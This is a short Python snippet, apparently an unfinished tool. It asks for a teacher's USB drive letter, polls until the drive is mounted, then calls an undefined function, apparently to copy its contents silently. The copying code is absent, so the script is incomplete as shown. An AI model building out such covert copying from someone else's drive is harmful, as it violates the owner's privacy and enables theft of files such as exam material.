import os
import time
from pathlib import Path
import re

u_charactor = input("请输入你老师 U 盘的盘符: ")
check_time = input("请输入查找 U 盘的间隔时间(second, type: integer): ")
root = Path(u_charactor+":/")


while(True):
    if root.is_dir():
        layer_trans(root)
        break
    else:
        time.sleep(int(float(check_time)))
        print("hahah")